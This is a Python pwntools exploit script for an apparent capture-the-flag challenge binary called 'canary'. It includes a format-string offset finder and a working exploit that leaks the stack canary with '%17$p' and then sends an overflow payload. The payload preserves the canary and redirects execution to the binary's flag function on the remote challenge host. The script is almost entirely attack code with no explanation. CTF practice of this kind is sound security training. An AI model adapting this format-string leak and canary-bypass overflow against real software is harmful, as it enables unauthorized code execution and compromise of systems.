from pwn import *

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        p = process("./canary")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("you, ")
        
        stack_value = p.recvline()[:-2]
        print "Stack value: {}".format(stack_value)
        # if stack_value.find("00") != -1:
        #     print "Offset found!"
        #     print "Stack value: {}".format(stack_value)
        #     break
        # else:
        #     print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    # p = process("./canary")
    p = remote("shell.actf.co", 20701)
    binary = ELF("canary")
    flag = binary.symbols['flag']

    p.sendline("%17$p")
    p.recvuntil("you, ")

    canary = int(p.recvline()[:-2], 16)
    log.info("Canary : {}".format(hex(canary)))

    payload = ''
    payload += 'A' * 56
    payload += p64(canary)
    payload += "PRAMPRAM"
    payload += p64(0x000000000040060e)
    payload += p64(flag)

    # gdb.attach(p, 'b *0x0000000000400945')

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
    # offset_finder()